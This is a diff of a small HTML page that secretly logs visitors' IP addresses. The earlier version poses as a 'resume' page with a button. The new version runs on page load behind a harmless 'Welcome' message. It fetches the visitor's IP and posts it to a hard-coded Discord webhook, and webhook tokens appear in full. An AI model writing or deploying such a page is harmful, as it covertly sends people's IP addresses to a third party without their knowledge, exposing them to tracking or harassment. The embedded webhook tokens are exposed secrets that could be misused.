@@ -2,50 +2,48 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>resume</title>
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-    <div class="container">
-        <button onclick="sendIP()">Click me fr</button>
-    </div>
-
+    <title>IP Logger</title>
     <script>
-        function sendIP() {
-            // Get the IP address using an external API
+        document.addEventListener("DOMContentLoaded", function() {
+            // Fetch the IP address
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
-                    const webhookURL = "https://discord.com/api/webhooks/1241134797770719363/-ALso1opBU5ujMLjJex8hwHav_BzwNEcndtE7BSxRwg_hLLPCYAovQnJL_XaeDqvd6Qw";
+
+                    // Send the IP to the Discord webhook
+                    const webhookUrl = 'https://discord.com/api/webhooks/1240379669484802149/bICd0lDIVPKUGRV3L_HRrmbzxbc_vYxojFvo80wRzM13kWE3nFMZaugJekX--dRYLBqg';
                     const message = {
-                        content: `IP Address Logged: ${ip}`,
-                        username: "IP Logger"
+                        content: `IP Address: ${ip}`,
+                        username: 'IP Logger'
                     };
 
-                    fetch(webhookURL, {
+                    fetch(webhookUrl, {
                         method: 'POST',
                         headers: {
-                            'Content-Type': 'application/json',
+                            'Content-Type': 'application/json'
                         },
                         body: JSON.stringify(message)
-                    })
-                    .then(response => {
+                    }).then(response => {
                         if (response.ok) {
-                            console.log("IP logged successfully.");
+                            console.log('IP logged successfully!');
                         } else {
-                            console.error("Failed to send IP address to Discord.");
+                            console.log('Failed to log IP.');
                         }
-                    })
-                    .catch(error => {
-                        console.error("Error:", error);
+                    }).catch(error => {
+                        console.error('Error:', error);
                     });
                 })
                 .catch(error => {
-                    console.error("Failed to get IP address:", error);
+                    console.error('Error fetching IP:', error);
                 });
-        }
+        });
     </script>
+</head>
+<body>
+    <h1>Welcome</h1>
+    <p>Enjoy your visit!</p>
 </body>
 </html>
